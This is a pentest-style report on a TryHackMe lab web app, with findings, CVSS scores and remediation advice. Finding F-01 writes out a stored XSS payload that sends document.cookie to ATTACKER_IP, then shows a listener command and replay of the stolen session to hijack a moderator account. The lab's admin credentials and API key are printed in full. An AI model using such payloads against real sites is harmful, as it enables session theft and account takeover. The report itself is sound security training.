WhatsYourName — Penetration Test Disclosure Report

TryHackMe Medium · 2026-07-13

Target: 10.64.189.164 (worldwap.thm / login.worldwap.thm) Assessment Date: 2026-07-13 Classification: CONFIDENTIAL

1. Executive Summary

A client-side exploitation assessment was conducted against the WorldWAP web application hosted at 10.64.189.164. Three critical vulnerabilities were identified: a stored Cross-Site Scripting (XSS) vulnerability in the registration form, a sensitive data exposure of hardcoded administrator credentials in a publicly accessible Python script, and missing security flags (httponly) on session cookies. These vulnerabilities were chained to achieve full compromise of both moderator and administrator accounts, resulting in the capture of both flags. No server-side exploitation was required.

5. Detailed Findings

F-01: Stored XSS in Registration Form (Name Field)

Severity: Critical (CVSSv3: 9.0) Affected Component: http://worldwap.thm/public/html/register.php → ../../api/register.php

Description: The WorldWAP registration form allows pre-registration with a "Name" field that is submitted as JSON to an API endpoint. The registration details are reviewed by a moderator whose browser renders the submitted data, including the Name field, without sanitization. This enables a stored Cross-Site Scripting (XSS) attack that executes in the moderator's browser context, allowing cookie theft and session hijacking.

Steps to Reproduce:

# 1. Register a user with XSS payload in the Name field
curl -X POST http://worldwap.thm/api/register.php \
  -H "Content-Type: application/json" \
  -H "X-THM-API-Key: e8d25b4208b80008a9e15c8698640e85" \
  -d '{"username":"xssuser","password":"test123","email":"xss@test.com","name":"<script>var i=new Image;i.src=\"http://ATTACKER_IP:9999/?cookie=\"+document.cookie;</script>"}'

# 2. Start HTTP listener on attacker machine
python3 -m http.server 9999

# 3. Wait ~45 seconds for moderator bot to review registration
# 4. Captured cookie: PHPSESSID=r8t1tvcjlm8s2qisd361vrn6jq

# 5. Use stolen cookie to impersonate moderator
curl -b "PHPSESSID=r8t1tvcjlm8s2qisd361vrn6jq" http://login.worldwap.thm/profile.php

Impact: Full session hijacking of moderator accounts. An attacker can impersonate any moderator, access the dashboard, view flags, and perform moderator-level actions.

CVSS Justification: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N — Network-accessible, low complexity, no privileges required, user interaction (moderator must review), changed scope (affects moderator session), high confidentiality and integrity impact.

F-02: Missing httponly Flag on PHPSESSID Cookie

Severity: High (CVSSv3: 7.4) Affected Component: PHPSESSID cookie on all login.php responses

Description: The PHPSESSID session cookie is set without the HttpOnly flag, making it accessible to JavaScript. This means that any XSS vulnerability in the application can be leveraged to read the session cookie and hijack user sessions. The cookie domain is set to .worldwap.thm, meaning it is shared across all subdomains and virtual hosts.

Steps to Reproduce:

curl -v http://10.64.189.164/login.php 2>&1 | grep "Set-Cookie"
# Output: Set-Cookie: PHPSESSID=...; path=/; domain=.worldwap.thm
# Note: No HttpOnly flag present

Impact: Amplifies the impact of any XSS vulnerability by enabling session cookie theft via document.cookie. Without this flag, XSS attacks are limited to same-origin actions but cannot exfiltrate session tokens.

CVSS Justification: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N — Network-accessible, low complexity, no privileges, user interaction required, high CIA impact.

F-03: Hardcoded Admin Credentials in Public admin.py

Severity: Critical (CVSSv3: 9.8) Affected Component: http://login.worldwap.thm/admin.py and http://worldwap.thm:8081/admin.py

Description: A Python Selenium bot script (admin.py) is publicly accessible on both virtual hosts. This script contains hardcoded administrator credentials in plaintext: admin:Un6u3$$4Bl3!!. The script also reveals the application's internal architecture, including the admin bot's behavior (logging in, navigating to chat, clicking links in messages).

Steps to Reproduce:

curl -s http://login.worldwap.thm/admin.py | grep -E "username|password"
# Output: username = 'admin'
# Output: password = 'Un6u3$$4Bl3!!'

Impact: Complete compromise of the administrator account without any exploitation. The exposed credentials provide direct access to the admin panel and all administrator functionality.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Network-accessible, low complexity, no privileges, no user interaction required, full CIA compromise.

F-04: Sensitive File Exposure (setup.php, API endpoint)

Severity: Medium (CVSSv3: 5.3) Affected Component: /setup.php, /api/register.php

Description: The setup.php script is publicly accessible and can be invoked to recreate the database, tables, and initial records. The /api/register.php endpoint is accessible with a static API key embedded in client-side JavaScript. These files should not be publicly accessible in production.

Steps to Reproduce:

curl -s http://10.64.189.164/setup.php
# Output: Database created successfully / Table users created / etc.

curl -s http://worldwap.thm/public/js/register.js | grep "API-Key"
# Output: 'X-THM-API-Key': 'e8d25b4208b80008a9e15c8698640e85'

Impact: Database reset/recreation via setup.php, and unauthorized registration via exposed API endpoint and key.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L — Network-accessable, low complexity, no privileges, no user interaction, low integrity and availability impact.

6. Remediation Recommendations

  1. F-01 (XSS): Implement server-side input sanitization and output encoding on all user-supplied fields. Use a Content Security Policy (CSP) to restrict inline script execution. Consider using HTMLPurifier or a similar library for the Name field.
  1. F-02 (httponly): Set the HttpOnly flag on all session cookies in the PHP configuration:
    2.    session.cookie_httponly = 1
  1. F-03 (Credential Exposure): Remove admin.py from the web-accessible directory. Never store credentials in source code. Use environment variables or a secrets manager for sensitive configuration. Rotate the exposed admin password immediately.
  1. F-04 (File Exposure): Remove or restrict access to setup.php and the API registration endpoint in production. Use .htaccess rules or Apache configuration to deny access to sensitive files. Move API keys to server-side configuration.
